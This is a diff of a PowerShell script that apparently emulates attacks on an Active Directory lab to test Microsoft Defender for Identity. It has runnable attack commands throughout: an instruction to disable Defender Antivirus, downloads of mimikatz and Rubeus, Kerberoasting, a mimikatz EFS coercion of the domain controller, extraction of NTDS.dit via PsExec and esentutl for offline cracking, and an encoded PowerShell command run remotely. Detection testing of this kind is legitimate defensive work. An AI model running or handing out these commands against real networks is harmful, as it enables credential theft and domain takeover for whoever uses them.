@@ -2,7 +2,8 @@
 # Sources: 
 # - https://jeffreyappel.nl/how-to-implement-defender-for-identity-and-configure-all-prerequisites/
 
-# Be sure to DEFANG MDAV (Microsoft Defender Antivirus)
+# Be sure to DEFANG MDAV (Microsoft Defender Antivirus) before running these tools on the endpoint
+# The Win10 client is domain joined with the domain user having local admin privs
 
 # Create C:\tools file share on DC - RCCE-SVR19-1
 # Copy the contents from \\RCCE-SVR19-1\tools to C:\Tools
@@ -13,8 +14,7 @@ Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download
 
 Invoke-WebRequest -Uri "https://github.com/ANSSI-FR/ORADAD/releases/download/3.3.210/ORADAD.zip" -OutFile "C:\tools\ORADAD.zip"
 
-Invoke-WebRequest -Uri "https://raw.github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" -OutFile "C:\tools\Rubeus.exe"
-
+#Invoke-WebRequest -Uri "https://raw.github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" -OutFile "C:\tools\Rubeus.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/Rubeus.exe" -OutFile "C:\tools\Rubeus.exe"
 
 Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\tools\PSTools.zip"
@@ -27,12 +27,13 @@ Expand-Archive -Path "C:\tools\ORADAD.zip" -DestinationPath "C:\tools\oradad\"
 
 Expand-Archive -Path "C:\tools\PSTools.zip" -DestinationPath "C:\tools\pstools\"
 
-# REMOVE FOLDERS IF NEED BE
-Remove-Item -Path "C:\tools\oradad" -Recurse -Force
-Remove-Item -Path "C:\tools\pstools" -Recurse -Force
-Remove-Item -Path "C:\tools\mkz" -Recurse -Force
 
 # ------------- EMULATE VARIOUS THREATS ----------------
+
+# AD Reconnaissance
+# https://www.joeware.net/freetools/tools/netsess/
+netsess.exe cloudhunters.local
+
 # ------------------------------------------------------
 # Network mapping reconnaissance (DNS)
 nslookup 
@@ -76,8 +77,13 @@ C:\tools\Rubeus.exe kerberoast /dc:RCCE-SVR19-1 /creduser:cloudhunters.local\jjb
 C:\tools\mkz\x64\mimikatz.exe "privilege::debug" "misc::efs /server:RCCE-SVR19-1 /connect:172.16.0.10 /noauth" "exit"
 
 # Data Exfiltration of NTDS.DIT file for offline cracking
-C:\tools\PsExec.exe \\RCCE-SVR19-1 -accepteula -sid c:\windows\system32\Esentutl.exe /y /i c:\Windows\NTDS\ntds.dit /d c:\tools\ntds.dit /vssrec ; Copy-Item -Path "\\RCCE-SVR19-1\tools\ntds.dit" -Destination "C:\tools"
+C:\tools\pstools\PsExec.exe \\RCCE-SVR19-1 -accepteula -sid c:\windows\system32\Esentutl.exe /y /i c:\Windows\NTDS\ntds.dit /d c:\tools\ntds.dit /vssrec ; Copy-Item -Path "\\RCCE-SVR19-1\tools\ntds.dit" -Destination "C:\tools"
 
 # Remote Code Execution attempts
 winrs /r:RCCE-SVR19-1 "powershell -NonInteractive -OutputFormat xml -NoProfile -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAaABhAHIAZQAgAC0AUAByAG8AcABlAHIAdAB5ACAATgBhAG0AZQAsAFMAdABhAHQAdQBzACwAUABhAHQAaAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABSAE8ATwBUAFwAYwBpAG0AdgAyACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBDAFMAVgAgAC0ATgBvAFQAeQBwAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAA=="
 
+
+# REMOVE FOLDERS IF NEED BE
+Remove-Item -Path "C:\tools\oradad" -Recurse -Force
+Remove-Item -Path "C:\tools\pstools" -Recurse -Force
+Remove-Item -Path "C:\tools\mkz" -Recurse -Force
